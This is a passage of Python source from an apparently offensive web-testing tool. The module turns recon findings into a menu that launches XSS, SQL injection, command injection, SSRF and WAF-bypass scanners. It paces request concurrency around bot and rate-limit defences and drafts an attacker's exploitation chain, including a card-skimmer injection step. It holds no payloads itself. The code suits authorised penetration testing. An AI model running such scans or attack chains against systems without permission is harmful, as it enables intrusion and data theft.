"""
Interactive post-recon menu — analyzes findings and offers targeted next steps.

After `fray recon <target>` completes, this module presents a smart menu:

  ┌──────────────────────────────────────────────┐
  │  What would you like to do next?             │
  ├──────────────────────────────────────────────┤
  │  [1] 📄 Generate HTML Report                 │
  │  [2] 🎯 Test XSS (3 reflected params found)  │
  │  [3] 💉 Test SQLi (search endpoint, no WAF)  │
  │  [4] 🔬 Deep Scan (all vulns, smart mode)    │
  │  [5] 🚀 Auto-Pilot (report + test all)       │
  │  [q] Exit                                    │
  └──────────────────────────────────────────────┘

Options are dynamically generated based on actual recon findings.
"""

from __future__ import annotations

import json
import os
import sys
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from fray.share_status import share_status as _share_status


# ── Severity ordering ──────────────────────────────────────────────────

_SEV_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
_SEV_EMOJI = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🔵", "info": "⚪"}

# ── Vuln type → module mapping ─────────────────────────────────────────

_VULN_MODULE_MAP = {
    "xss": ("fray.xss", "XSSScanner", "XSS (Cross-Site Scripting)"),
    "sqli": ("fray.sqli", "SQLiInjector", "SQL Injection"),
    "cmdi": ("fray.cmdi", "CMDiScanner", "Command Injection"),
    "cache_poison": ("fray.cache_poison", "CachePoisonScanner", "Cache Poisoning"),
    "massassign": ("fray.massassign", "MassAssignScanner", "Mass Assignment / HPP"),
    "deser": ("fray.deser", "DeserScanner", "Deserialization"),
    "ssrf": ("fray.ssrf", "SSRFScanner", "Server-Side Request Forgery"),
    "ssti": ("fray.ssti", "SSTIScanner", "Server-Side Template Injection"),
    "prototype_pollution": ("fray.proto_pollution", "PPScanner", "Prototype Pollution"),
    "csp_bypass": ("fray.csp_scanner", "CSPBypassScanner", "CSP Bypass"),
    "modern_bypasses": ("fray.modern_bypasses", "ModernBypassScanner", "Modern WAF Bypasses"),
}

# ── Category keywords in findings text ─────────────────────────────────

_FINDING_KEYWORDS = {
    "xss": ["xss", "cross-site", "reflected", "dom source", "dom sink", "script injection"],
    "sqli": ["sql", "injection", "database", "query", "union", "error-based"],
    "cmdi": ["command injection", "rce", "remote code", "shell", "os command"],
    "ssrf": ["ssrf", "server-side request", "internal", "redirect"],
    "ssti": ["template injection", "ssti", "jinja", "twig", "freemarker"],
    "cache_poison": ["cache", "poison", "cdn", "x-forwarded", "unkeyed header"],
    "cors": ["cors", "access-control", "origin"],
    "csp": ["csp", "content-security-policy", "unsafe-inline", "unsafe-eval"],
    "host_header": ["host header", "host injection"],
    "open_redirect": ["redirect", "open redirect"],
    "takeover": ["takeover", "dangling", "cname", "subdomain takeover"],
    "exposed": ["exposed", "admin panel", "sensitive file", "backup", ".env", "debug"],
    "tls": ["tls", "ssl", "certificate", "expired cert", "weak cipher"],
    "prototype_pollution": ["prototype", "__proto__", "pollution", "constructor.prototype", "merge", "lodash"],
}


@dataclass
class MenuOption:
    """A single interactive menu option."""
    key: str                    # "1", "2", etc.
    emoji: str                  # Display emoji
    label: str                  # Short label
    description: str            # Why this option is recommended
    action: str                 # Action type: "report", "test", "deep", "autopilot"
    command: str                # Exact fray CLI command
    priority: int = 0           # Lower = higher priority
    vuln_types: List[str] = field(default_factory=list)
    targets: List[str] = field(default_factory=list)
    params: Dict[str, Any] = field(default_factory=dict)


class ReconInteractive:
    """Analyze recon results and present an interactive menu of next steps."""

    def __init__(self, target: str, recon_result: dict, export_dir: str = ""):
        self.target = target
        self.recon = recon_result
        self.export_dir = export_dir
        self.atk = recon_result.get("attack_surface", {})
        self.findings = self.atk.get("findings", [])
        self.waf = self.atk.get("waf_vendor") or ""
        self.risk_score = self.atk.get("risk_score", 0)
        self.risk_level = self.atk.get("risk_level", "?")
        self.recs = recon_result.get("recommended_categories", [])
        self.vectors = self.atk.get("attack_vectors", [])
        self.hvt = self.atk.get("high_value_targets", [])
        self.suggested = self.atk.get("suggested_tests", [])
        self.subdomains = self.atk.get("subdomains", 0)

    # ── Analyze findings to determine what vulns to test ───────────────

    def _classify_findings(self) -> Dict[str, List[dict]]:
        """Group findings by vulnerability type based on keywords."""
        classified: Dict[str, List[dict]] = {}
        for f in self.findings:
            text = f.get("finding", "").lower()
            sev = f.get("severity", "info")
            matched = False
            for vuln_type, keywords in _FINDING_KEYWORDS.items():
                if any(kw in text for kw in keywords):
                    classified.setdefault(vuln_type, []).append(f)
                    matched = True
                    break
            if not matched:
                classified.setdefault("other", []).append(f)
        return classified

    def _get_injectable_params(self) -> List[Dict[str, str]]:
        """Extract injectable parameters from recon data."""
        params_data = self.recon.get("params", {})
        injectable = []
        if isinstance(params_data, dict):
            for param_name, info in params_data.items():
                if isinstance(info, dict) and info.get("injectable"):
                    injectable.append({
                        "param": param_name,
                        "url": info.get("url", self.target),
                        "method": info.get("method", "GET"),
                    })
        return injectable

    def _get_search_endpoints(self) -> List[str]:
        """Find search/query endpoints from recon."""
        endpoints = []
        # From high-value targets
        for hvt in self.hvt:
            url = hvt if isinstance(hvt, str) else hvt.get("url", "")
            if any(kw in url.lower() for kw in ["search", "query", "q=", "s=", "keyword"]):
                endpoints.append(url)
        # From attack vectors
        for vec in self.vectors:
            url = vec.get("url", "") if isinstance(vec, dict) else ""
            if any(kw in url.lower() for kw in ["search", "query", "q=", "s="]):
                endpoints.append(url)
        return list(set(endpoints))[:5]

    # ── Build smart menu options ───────────────────────────────────────

    def build_options(self) -> List[MenuOption]:
        """Generate 3-5 context-aware menu options based on findings."""
        options: List[MenuOption] = []
        classified = self._classify_findings()
        injectable = self._get_injectable_params()

        # ── Option: Generate HTML Report (always available) ────────────
        report_path = ""
        if self.export_dir:
            report_path = os.path.join(self.export_dir, "report.html")
        else:
            domain = self.recon.get("host", "target")
            report_path = f"{domain}_recon.html"

        options.append(MenuOption(
            key="1", emoji="📄", label="Generate HTML Report",
            description=f"Full recon report ({len(self.findings)} findings, risk {self.risk_score}/100)",
            action="report",
            command=f"fray recon {self.target} -o {report_path}",
            priority=10,
            params={"output": report_path},
        ))

        # ── Vuln-specific test options ─────────────────────────────────
        priority_counter = 0
        vuln_options: List[MenuOption] = []

        # Sort classified findings by highest severity
        sorted_vulns = sorted(
            classified.items(),
            key=lambda x: min(_SEV_RANK.get(f.get("severity", "info"), 4) for f in x[1])
        )

        for vuln_type, vuln_findings in sorted_vulns:
            if vuln_type == "other":
                continue

            top_sev = min(f.get("severity", "info") for f in vuln_findings)
            count = len(vuln_findings)
            emoji = _SEV_EMOJI.get(top_sev, "⚪")

            # Map to fray test category
            test_cat = vuln_type
            if vuln_type in ("cors", "host_header", "exposed", "tls", "takeover"):
                continue  # Not directly testable with payload modules

            module_info = _VULN_MODULE_MAP.get(vuln_type)
            if not module_info:
                continue

            _, _, display_name = module_info

            # Build description based on findings
            finding_texts = [f.get("finding", "")[:60] for f in vuln_findings[:2]]
            desc_parts = [f"{count} finding{'s' if count > 1 else ''}"]
            if finding_texts:
                desc_parts.append(finding_texts[0])

            # Determine target URL for the test
            test_target = self.target
            test_params = {}

            # If we have injectable params, target the best one
            if injectable and vuln_type in ("xss", "sqli", "cmdi"):
                best = injectable[0]
                test_target = best["url"]
                test_params["param"] = best["param"]

            cmd = f"fray test {self.target} -c {test_cat} --smart"
            if self.waf:
                cmd += f"  # WAF: {self.waf}"

            vuln_options.append(MenuOption(
                key="",  # Assigned later
                emoji=emoji,
                label=f"Test {display_name}",
                description=" — ".join(desc_parts),
                action="test",
                command=cmd,
                priority=priority_counter,
                vuln_types=[vuln_type],
                targets=[test_target],
                params=test_params,
            ))
            priority_counter += 1

        # If no findings-based vulns, use recommended_categories
        if not vuln_options and self.recs:
            for cat in self.recs[:3]:
                cat_name = cat if isinstance(cat, str) else cat.get("category", "xss")
                module_info = _VULN_MODULE_MAP.get(cat_name)
                display_name = module_info[2] if module_info else cat_name.upper()

                vuln_options.append(MenuOption(
                    key="",
                    emoji="🎯",
                    label=f"Test {display_name}",
                    description=f"Recommended based on tech stack + WAF profile",
                    action="test",
                    command=f"fray test {self.target} -c {cat_name} --smart",
                    priority=priority_counter,
                    vuln_types=[cat_name],
                    targets=[self.target],
                ))
                priority_counter += 1

        # Take top 2-3 vuln options
        vuln_options.sort(key=lambda o: o.priority)
        for opt in vuln_options[:3]:
            options.append(opt)

        # ── Deep scan option ───────────────────────────────────────────
        all_cats = [o.vuln_types[0] for o in vuln_options if o.vuln_types]
        if not all_cats:
            all_cats = [c if isinstance(c, str) else c.get("category", "xss")
                        for c in self.recs[:5]] or ["xss", "sqli"]

        deep_cats = ",".join(all_cats[:5])
        deep_desc = f"All identified vulns ({', '.join(all_cats[:3])}{'...' if len(all_cats) > 3 else ''})"
        options.append(MenuOption(
            key="",
            emoji="🔬",
            label="Deep Scan — All Vulnerabilities",
            description=deep_desc,
            action="deep",
            command=f"fray test {self.target} -c {deep_cats} --smart --max 200",
            priority=90,
            vuln_types=all_cats[:5],
        ))

        # ── Auto-pilot option ─────────────────────────────────────────
        options.append(MenuOption(
            key="",
            emoji="🚀",
            label="Auto-Pilot (Report + Test All)",
            description=f"Generate report, then test top {min(len(all_cats), 5)} categories automatically",
            action="autopilot",
            command=f"fray scan {self.target} --smart",
            priority=99,
            vuln_types=all_cats[:5],
            params={"report_path": report_path},
        ))

        # Assign keys
        for i, opt in enumerate(options):
            opt.key = str(i + 1)

        return options

    # ── Display ────────────────────────────────────────────────────────

    def print_menu(self, options: List[MenuOption]) -> None:
        """Print the interactive menu to stderr (so stdout stays clean for pipes)."""
        from fray.ui import S, severity_color, severity_summary, pill

        out = sys.stderr

        # Findings summary
        sev_counts = {}
        for f in self.findings:
            s = f.get("severity", "info")
            sev_counts[s] = sev_counts.get(s, 0) + 1

        # Header
        from fray.ui import _term_width as _tw
        _w = _tw()
        out.write(f"\n  {S.brand}{'━' * _w}{S.reset}\n")
        out.write(f"  {S.bold}{S.white}  ⚔  Recon Complete — What next?{S.reset}\n")
        out.write(f"  {S.brand}{'━' * _w}{S.reset}\n")
        out.write("\n")

        # Stats row
        if self.findings:
            out.write(f"  {severity_summary(sev_counts)}\n")
        risk_color = S.critical if self.risk_score >= 70 else S.high if self.risk_score >= 40 else S.success
        out.write(f"  {S.gray}Risk{S.reset}  {risk_color}{S.bold}{self.risk_score}/100{S.reset} {S.dim}({self.risk_level}){S.reset}")
        if self.waf:
            out.write(f"  {S.gray}WAF{S.reset}  {S.accent}{self.waf}{S.reset}")
        out.write("\n\n")

        # Options
        for opt in options:
            # Key badge
            key_badge = f"{S.bg_brand}{S.bold}{S.white} {opt.key} {S.reset}"

            # Severity-colored emoji for vuln options
            if opt.vuln_types and opt.action == "test":
                # Find top severity for this vuln type
                top_sev = "info"
                classified = self._classify_findings()
                for vt in opt.vuln_types:
                    for f in classified.get(vt, []):
                        fs = f.get("severity", "info")
                        if _SEV_RANK.get(fs, 4) < _SEV_RANK.get(top_sev, 4):
                            top_sev = fs
                sc = severity_color(top_sev)
                label = f"{sc}{S.bold}{opt.label}{S.reset}"
            elif opt.action == "report":
                label = f"{S.brand2}{S.bold}{opt.label}{S.reset}"
            elif opt.action == "deep":
                label = f"{S.info}{S.bold}{opt.label}{S.reset}"
            elif opt.action == "autopilot":
                label = f"{S.success}{S.bold}{opt.label}{S.reset}"
            else:
                label = f"{S.white}{S.bold}{opt.label}{S.reset}"

            out.write(f"  {key_badge} {label}\n")
            out.write(f"       {S.dim}{opt.description}{S.reset}\n\n")

        # Exit
        out.write(f"  {S.dark}  q   Exit{S.reset}\n")
        out.write(f"\n  {S.dark}{'─' * _tw()}{S.reset}\n")
        out.flush()

    # ── Execute selected option ────────────────────────────────────────

    def execute(self, option: MenuOption) -> None:
        """Execute the selected menu option."""
        if option.action == "report":
            self._do_report(option)
        elif option.action == "test":
            self._do_test(option)
        elif option.action == "deep":
            self._do_deep(option)
        elif option.action == "autopilot":
            self._do_autopilot(option)

    def _do_report(self, option: MenuOption) -> None:
        """Generate HTML report from recon data."""
        from fray.reporter import SecurityReportGenerator

        report_path = option.params.get("output", "")
        if not report_path:
            domain = self.recon.get("host", "target")
            report_path = f"{domain}_recon.html"

        gen = SecurityReportGenerator()
        gen.generate_recon_html_report(self.recon, report_path)
        sys.stderr.write(f"\n  ✅ HTML report generated: {report_path}\n")
        sys.stderr.write(f"     Open in browser: file://{os.path.abspath(report_path)}\n\n")

    def _do_test(self, option: MenuOption) -> None:
        """Run targeted payload tests for specific vulnerability types."""
        vuln_types = option.vuln_types
        targets = option.targets or [self.target]

        sys.stderr.write(f"\n  🎯 Testing: {', '.join(vuln_types)}\n")
        sys.stderr.write(f"     Target: {targets[0]}\n")
        if self.waf:
            sys.stderr.write(f"     WAF: {self.waf}\n")
        sys.stderr.write(f"     Command: {option.command}\n\n")

        for vtype in vuln_types:
            self._run_module(vtype, targets[0], option.params)

    def _do_deep(self, option: MenuOption) -> None:
        """Run all identified vulnerability tests."""
        sys.stderr.write(f"\n  🔬 Deep scan: {', '.join(option.vuln_types)}\n")
        sys.stderr.write(f"     Target: {self.target}\n\n")

        for vtype in option.vuln_types:
            self._run_module(vtype, self.target, option.params)

    def _do_autopilot(self, option: MenuOption) -> None:
        """Generate report + run all tests."""
        # Step 1: Report
        report_path = option.params.get("report_path", "")
        if report_path:
            sys.stderr.write("  ── Step 1/2: Generating HTML Report ──\n")
            from fray.reporter import SecurityReportGenerator
            gen = SecurityReportGenerator()
            gen.generate_recon_html_report(self.recon, report_path)
            sys.stderr.write(f"  ✅ Report: {report_path}\n\n")

        # Step 2: Test all vuln types
        sys.stderr.write("  ── Step 2/2: Testing Vulnerabilities ──\n")
        for vtype in option.vuln_types:
            self._run_module(vtype, self.target, option.params)

        sys.stderr.write(f"\n  🏁 Auto-pilot complete.\n")
        if report_path:
            sys.stderr.write(f"     Report: file://{os.path.abspath(report_path)}\n")
        sys.stderr.write("\n")

    def _run_module(self, vuln_type: str, target: str, params: dict) -> Optional[dict]:
        """Run a specific vulnerability test module and print results.

        Returns dict with keys: module, target, vulnerable, findings, requests
        or None on skip/error.
        """
        module_info = _VULN_MODULE_MAP.get(vuln_type)
        if not module_info or not module_info[0]:
            # No deep module — fallback to fray test CLI
            sys.stderr.write(f"  ⏭  {vuln_type}: use `fray test {target} -c {vuln_type} --smart`\n")
            return None

        mod_path, class_name, display_name = module_info
        sys.stderr.write(f"  ▶ {display_name}...")
        sys.stderr.flush()
        t0 = time.monotonic()

        try:
            import importlib
            mod = importlib.import_module(mod_path)
            scanner_cls = getattr(mod, class_name)

            # Build scanner kwargs
            kwargs = {
                "timeout": 6,
                "verify_ssl": False,
            }

            if vuln_type == "cache_poison":
                scanner = scanner_cls(target, level=2, **kwargs)
            elif vuln_type in ("xss", "sqli", "cmdi"):
                # Need a param — try to find one
                param = params.get("param", "")
                if not param:
                    param = self._guess_param(target)
                if not param:
                    sys.stderr.write(f" no injectable param found, skipping\n")
                    return
                kwargs["param"] = param
                if vuln_type in ("sqli", "cmdi"):
                    kwargs["level"] = 1
                    kwargs["risk"] = 1
                scanner = scanner_cls(target, **kwargs)
            elif vuln_type == "massassign":
                scanner = scanner_cls(target, method="GET", level=1, **kwargs)
            elif vuln_type in ("deser", "ssrf"):
                param = params.get("param", "") or self._guess_param(target)
                if not param:
                    sys.stderr.write(f" no param found, skipping\n")
                    return
                scanner = scanner_cls(target, param=param, **kwargs)
            elif vuln_type == "ssti":
                param = params.get("param", "") or self._guess_param(target) or "q"
                scanner = scanner_cls(target, param=param, level=1, **kwargs)
            elif vuln_type == "csp_bypass":
                # CSP scanner doesn't need a param
                scanner = scanner_cls(target, **kwargs)
            elif vuln_type == "modern_bypasses":
                param = params.get("param", "") or self._guess_param(target) or "q"
                waf = self.waf or ""
                scanner = scanner_cls(target, param=param, waf_vendor=waf, **kwargs)
            else:
                scanner = scanner_cls(target, **kwargs)

            result = scanner.scan()
            elapsed = (time.monotonic() - t0) * 1000

            # Print result
            vuln = getattr(result, "vulnerable", False)
            findings = getattr(result, "findings", [])
            requests = getattr(result, "requests_made", 0)

            if vuln:
                sys.stderr.write(f" \033[91mVULNERABLE\033[0m ({len(findings)} findings, {requests} reqs, {elapsed:.0f}ms)\n")
                for f in findings[:5]:
                    if hasattr(f, "payload"):
                        sys.stderr.write(f"    → {f.payload[:80]}\n")
                    elif hasattr(f, "technique"):
                        sys.stderr.write(f"    → [{f.technique}] {getattr(f, 'evidence', '')[:60]}\n")
                    elif hasattr(f, "header"):
                        sys.stderr.write(f"    → [{f.header}] {getattr(f, 'evidence', '')[:60]}\n")
            else:
                sys.stderr.write(f" clean ({requests} reqs, {elapsed:.0f}ms)\n")

            # Output JSON to stdout for piping
            result_dict = result.to_dict() if hasattr(result, "to_dict") else {"vulnerable": vuln}
            result_dict["module"] = vuln_type
            result_dict["target"] = target
            print(json.dumps(result_dict, ensure_ascii=False, default=str))

            return {
                "module": vuln_type,
                "target": target,
                "vulnerable": vuln,
                "findings": len(findings),
                "requests": requests,
                "elapsed_ms": elapsed,
            }

        except Exception as e:
            elapsed = (time.monotonic() - t0) * 1000
            sys.stderr.write(f" error: {e} ({elapsed:.0f}ms)\n")
            return None

    def _guess_param(self, url: str) -> str:
        """Guess the best injectable parameter from URL or recon data."""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        if qs:
            # Prefer common injectable param names
            for preferred in ["q", "s", "search", "query", "keyword", "id", "cat",
                              "page", "name", "user", "input", "url", "path", "file"]:
                if preferred in qs:
                    return preferred
            return list(qs.keys())[0]

        # Try recon params data
        params_data = self.recon.get("params", {})
        if isinstance(params_data, dict):
            for pname, info in params_data.items():
                if isinstance(info, dict) and info.get("injectable"):
                    return pname

        # Fallback: common param names
        return "q"

    # ── Main interactive loop ──────────────────────────────────────────

    def run(self) -> Optional[str]:
        """Show menu, get user choice, execute. Returns action taken or None."""
        if not sys.stdin.isatty():
            return None  # Non-interactive — skip

        options = self.build_options()
        if not options:
            return None

        self.print_menu(options)

        # Prompt
        try:
            from fray.ui import S
            prompt = f"\n  {S.brand}▸{S.reset} {S.white}Select{S.reset} {S.dim}[1-{len(options)}/q]{S.reset}: "
            choice = input(prompt).strip().lower()
        except (EOFError, KeyboardInterrupt):
            sys.stderr.write("\n")
            return None

        if choice == "q" or choice == "":
            return None

        # Find matching option
        selected = None
        for opt in options:
            if opt.key == choice:
                selected = opt
                break

        if not selected:
            sys.stderr.write(f"  Invalid choice: {choice}\n")
            return None

        from fray.ui import S
        sys.stderr.write(f"\n  {S.brand}▸{S.reset} {S.bold}{S.white}{selected.label}{S.reset}\n")
        self.execute(selected)
        return selected.action


# ═══════════════════════════════════════════════════════════════════════
# Next-step hints — printed after any fray command to guide the user
# ═══════════════════════════════════════════════════════════════════════

def next_steps(target: str, context: str = "recon", *,
               recon: dict = None, findings_count: int = 0,
               bypassed: int = 0, blocked: int = 0,
               categories: list = None, waf: str = "") -> None:
    """Print smart 'what to type next' hints after any fray command.

    context: "recon", "test", "scan", "bypass", "harden"
    """
    if not sys.stderr.isatty():
        return
    if os.environ.get("FRAY_NO_HINTS"):
        return

    from fray.ui import S, cmd_hint, section_title

    out = sys.stderr
    out.write(section_title("Next Steps"))

    if context == "recon":
        cats = categories or []
        if cats:
            top = cats[0] if isinstance(cats[0], str) else cats[0].get("category", "xss")
            out.write(cmd_hint(f"fray test {target} -c {top} --smart",
                               f"Test top category ({top})") + "\n")
        out.write(cmd_hint(f"fray go {target}",
                           "Full guided pipeline") + "\n")
        if waf:
            out.write(cmd_hint(f"fray bypass {target} -c xss",
                               f"WAF bypass ({waf})") + "\n")
        out.write(cmd_hint(f"fray harden {target}",
                           "Security headers audit (A-F)") + "\n")

    elif context == "test":
        if bypassed > 0:
            out.write(cmd_hint(f"fray report -i results.json -o report.html",
                               f"Generate report ({bypassed} bypasses)") + "\n")
            out.write(cmd_hint(f"fray bypass {target} -c xss",
                               "AI-powered bypass amplification") + "\n")
        else:
            other_cats = ["sqli", "ssrf", "ssti", "cmdi"]
            if categories:
                other_cats = [c for c in other_cats if c not in categories]
            cat_str = ",".join(other_cats[:3])
            out.write(cmd_hint(f"fray test {target} -c {cat_str} --smart",
                               "Try different categories") + "\n")
            out.write(cmd_hint(f"fray agent {target} -c xss --rounds 3",
                               "Self-learning agent") + "\n")
        out.write(cmd_hint(f"fray harden {target}",
                           "Check security posture") + "\n")

    elif context == "scan":
        if bypassed > 0:
            out.write(cmd_hint(f"fray report -i results.json -o report.html",
                               "Generate client-ready report") + "\n")
        out.write(cmd_hint(f"fray recon {target} --deep",
                           "Deep recon (300 subdomains)") + "\n")
        out.write(cmd_hint(f"fray harden {target}",
                           "OWASP hardening audit") + "\n")

    elif context == "bypass":
        if bypassed > 0:
            out.write(cmd_hint(f"fray report -i results.json -o report.html",
                               f"Generate report ({bypassed} bypasses)") + "\n")
        out.write(cmd_hint(f"fray agent {target} -c xss --rounds 5",
                           "Self-improving agent (longer)") + "\n")
        out.write(cmd_hint(f"fray harden {target}",
                           "Check security posture") + "\n")

    elif context == "detect":
        out.write(cmd_hint(f"fray recon {target}",
                           "Full reconnaissance (35+ checks)") + "\n")
        out.write(cmd_hint(f"fray go {target}",
                           "Guided pipeline (recon+test+report)") + "\n")
        if waf:
            out.write(cmd_hint(f"fray test {target} -c xss --smart",
                               f"Test payloads against {waf}") + "\n")
            out.write(cmd_hint(f"fray bypass {target} --waf {waf.lower().replace(' ', '_')} -c xss",
                               f"WAF bypass scoring") + "\n")
        else:
            out.write(cmd_hint(f"fray test {target} -c xss --smart",
                               "No WAF detected — test payloads") + "\n")

    elif context == "harden":
        out.write(cmd_hint(f"fray recon {target}",
                           "Full recon for deeper analysis") + "\n")
        out.write(cmd_hint(f"fray test {target} -c xss --smart",
                           "Test WAF with smart payloads") + "\n")
        out.write(cmd_hint(f"fray scan {target}",
                           "Auto crawl + inject + detect") + "\n")

    elif context == "agent":
        if bypassed > 0:
            out.write(cmd_hint(f"fray report -i results.json -o report.html",
                               f"Generate report ({bypassed} bypasses)") + "\n")
        out.write(cmd_hint(f"fray agent {target} -c xss --rounds 10 --ai",
                           "AI-assisted agent (longer run)") + "\n")
        out.write(cmd_hint(f"fray bypass {target} -c xss",
                           "WAF bypass scoring") + "\n")
        out.write(cmd_hint(f"fray harden {target}",
                           "Security posture audit") + "\n")

    elif context == "graph":
        out.write(cmd_hint(f"fray recon {target} --deep",
                           "Deep recon (300 subdomains)") + "\n")
        out.write(cmd_hint(f"fray go {target}",
                           "Guided pipeline (recon+test+report)") + "\n")
        out.write(cmd_hint(f"fray scan {target}",
                           "Auto crawl + payload injection") + "\n")

    elif context == "bounty":
        out.write(cmd_hint(f"fray go {target}",
                           "Guided pipeline per target") + "\n")
        out.write(cmd_hint(f"fray recon {target}",
                           "Deep recon on interesting target") + "\n")
        out.write(cmd_hint(f"fray agent {target} -c xss --rounds 5",
                           "Self-learning agent") + "\n")

    elif context == "auto":
        out.write(cmd_hint(f"fray agent {target} -c xss --rounds 5",
                           "Self-learning agent (deeper)") + "\n")
        out.write(cmd_hint(f"fray harden {target}",
                           "Security headers + OWASP audit") + "\n")
        out.write(cmd_hint(f"fray recon {target} --deep",
                           "Extended DNS, 300 subdomains") + "\n")

    elif context == "smuggle":
        out.write(cmd_hint(f"fray recon {target}",
                           "Full reconnaissance") + "\n")
        out.write(cmd_hint(f"fray scan {target}",
                           "Auto crawl + payload injection") + "\n")
        out.write(cmd_hint(f"fray harden {target}",
                           "Security posture audit") + "\n")

    out.write("\n")
    out.flush()


# ═══════════════════════════════════════════════════════════════════════
# GuidedPipeline — `fray go <url>` zero-knowledge full pipeline
# ═══════════════════════════════════════════════════════════════════════

def _auto_concurrency(recon_result: dict) -> int:
    """Determine safe parallel concurrency from recon intelligence.

    Returns concurrency level: 1 (sequential) to 10 (aggressive).
    """
    if not recon_result:
        return 1

    atk = recon_result.get("attack_surface", {})
    waf = (atk.get("waf_vendor") or "").lower()
    bot = recon_result.get("bot_protection", {})
    rate_info = recon_result.get("rate_limits", {})
    has_bot_detection = bool(bot.get("detected") or bot.get("has_captcha")
                            or bot.get("has_fingerprinting"))
    has_rate_limit = bool(rate_info.get("threshold_rps")
                         or rate_info.get("rate_limited"))

    # Aggressive: no WAF, no bot detection, no rate limits
    if not waf and not has_bot_detection and not has_rate_limit:
        return 10

    # Moderate: WAF present but no bot detection or rate limits
    if waf and not has_bot_detection and not has_rate_limit:
        return 5

    # Careful: WAF + rate limits but no bot detection
    if waf and has_rate_limit and not has_bot_detection:
        return 2

    # Very careful: bot detection active (Turnstile, DataDome, etc.)
    if has_bot_detection:
        return 1

    # Default: moderate
    return 3


def _build_attack_chain(
    target: str,
    recon_result: dict,
    test_results: list,
    risk: int,
    waf: str,
) -> list:
    """Build a numbered, prioritized exploitation chain from recon + test findings.

    Returns up to 6 steps. Each step:
        {title, detail, severity, command (optional), mitre}

    Design: shows the realistic path an attacker would take, not a generic checklist.
    Steps are ordered from easiest initial access → deepest impact.
    """
    steps = []
    _rd = recon_result or {}
    atk = _rd.get("attack_surface", {}) if isinstance(_rd, dict) else {}
    cloud_dist = _rd.get("cloud_distribution", {}) if isinstance(_rd, dict) else {}
    per_sub = cloud_dist.get("per_subdomain", []) if isinstance(cloud_dist, dict) else []

    def _host(url):
        return url.replace("https://", "").replace("http://", "").rstrip("/")

    # ── Step 1 candidate: Easiest initial access ─────────────────────────
    # Priority: unprotected sub > supply chain > auth bypass > WAF bypass > recon

    # Unprotected subdomain (no WAF = direct access)
    # Infrastructure subdomains are not useful WAF-bypass test targets
    # (ns1, ns2, mx, smtp, mail = DNS/mail infra — no HTTP app to test)
    _INFRA_PREFIXES = (
        "ns", "ns1", "ns2", "ns3", "ns4", "mx", "mx1", "mx2",
        "mail", "smtp", "pop", "imap", "ftp", "sftp", "vpn",
        "dns", "ntp", "syslog", "monitoring", "grafana",
    )
    def _is_infra_sub(s: dict) -> bool:
        name = s.get("subdomain", "").split(".")[0].lower()
        return name in _INFRA_PREFIXES or name.startswith("ns") and name[2:].isdigit()

    unprotected = [s for s in per_sub
                   if isinstance(s, dict) and not s.get("waf") and not s.get("cdn")
                   and not _is_infra_sub(s)]
    critical_subs = [s for s in unprotected
                     if any(kw in s.get("subdomain", "").lower()
                            for kw in ("api", "admin", "staging", "dev", "internal",
                                       "auth", "login", "account", "pay", "checkout",
                                       "app", "portal", "web", "www", "store", "shop"))]
    if critical_subs:
        sub = critical_subs[0]
        sub_url = f"https://{sub['subdomain']}"
        steps.append({
            "title": f"Direct access via unprotected {_host(sub_url)}",
            "detail": f"No WAF/CDN — all payloads reach origin server. {len(unprotected)} subdomain(s) exposed.",
            "severity": "critical",
            "command": f"fray xss {sub_url}",
            "mitre": "T1190"
        })
    elif unprotected:
        sub = unprotected[0]
        sub_url = f"https://{sub['subdomain']}"
        # Include specific injectable path if recon found one on this subdomain
        sub_path = ""
        for ep in (sub.get("endpoints") or sub.get("injectable_paths") or [])[:1]:
            sub_path = ep if isinstance(ep, str) else ep.get("path", "")
        test_url = f"{sub_url}{sub_path}" if sub_path else sub_url
        steps.append({
            "title": f"Test {_host(sub_url)} — no WAF protection",
            "detail": f"{len(unprotected)} web subdomain(s) without WAF. All payloads land directly.",
            "severity": "high",
            "command": f"fray test {test_url} --smart",
            "mitre": "T1190"
        })

    # Supply chain / Magecart
    sc = _rd.get("supply_chain", {})
    if isinstance(sc, dict) and sc.get("risk_level") in ("critical", "high"):
        skimmers = sc.get("skimmer_domains_found", [])
        sri_miss = sc.get("sri_missing_on_payment", [])
        if skimmers:
            steps.append({
                "title": "Magecart skimmer active — card data already being stolen",
                "detail": f"Script from known skimmer domain: {skimmers[0][:50]}",
                "severity": "critical",
                "command": None,
                "mitre": "T1195.002"
            })
        elif sri_miss:
            steps.append({
                "title": "Inject card skimmer via compromised CDN (no SRI)",
                "detail": f"{len(sri_miss)} external script(s) on payment page lack SRI integrity check",
                "severity": "critical",
                "command": f"fray test {target} -c csp_bypass --smart",
                "mitre": "T1195.002"
            })

    # Vulnerable Phase 2 findings
    for mr in (test_results or []):
        if not isinstance(mr, dict) or not mr.get("vulnerable"):
            continue
        mod = mr.get("module", "")
        mr_tgt = mr.get("target", target)
        bypasses = mr.get("bypasses", [])
        if "csp" in mod and "csp_bypass" not in [s.get("_cat") for s in steps]:
            top_bypass = bypasses[0].get("payload", "")[:40] if bypasses else ""
            # Use the specific vulnerable URL if known (from bypass finding)
            vuln_url = (bypasses[0].get("url") or bypasses[0].get("path") or mr_tgt
                        if bypasses else mr_tgt)
            if vuln_url and not vuln_url.startswith("http"):
                vuln_url = f"{mr_tgt.rstrip('/')}{vuln_url}"
            detail = f"CSP bypass confirmed"
            if top_bypass:
                detail += f". Bypass payload: {top_bypass!r}"
            if vuln_url and vuln_url != target:
                detail += f". Vulnerable at: {vuln_url}"
            steps.append({
                "title": f"XSS via CSP bypass on {_host(mr_tgt)}",
                "detail": detail,
                "severity": "critical",
                "command": f"fray agent {vuln_url} -c xss --rounds 10",
                "mitre": "T1059.007",
                "_cat": "csp_bypass"
            })
        elif "ssti" in mod:
            steps.append({
                "title": f"Server-Side Template Injection → RCE on {_host(mr_tgt)}",
                "detail": "SSTI confirmed. Escalate to code execution via template engine gadgets.",
                "severity": "critical",
                "command": f"fray test {mr_tgt} -c ssti --level 2",
                "mitre": "T1059",
                "_cat": "ssti"
            })

    # Auth bypass / account takeover
    auth_ep = _rd.get("auth_endpoints", {})
    auth_list = auth_ep.get("endpoints", []) if isinstance(auth_ep, dict) else []
    login_eps = [ep for ep in auth_list
                 if isinstance(ep, dict) and ep.get("category") in ("login", "signin")]
    if login_eps:
        ep = login_eps[0]
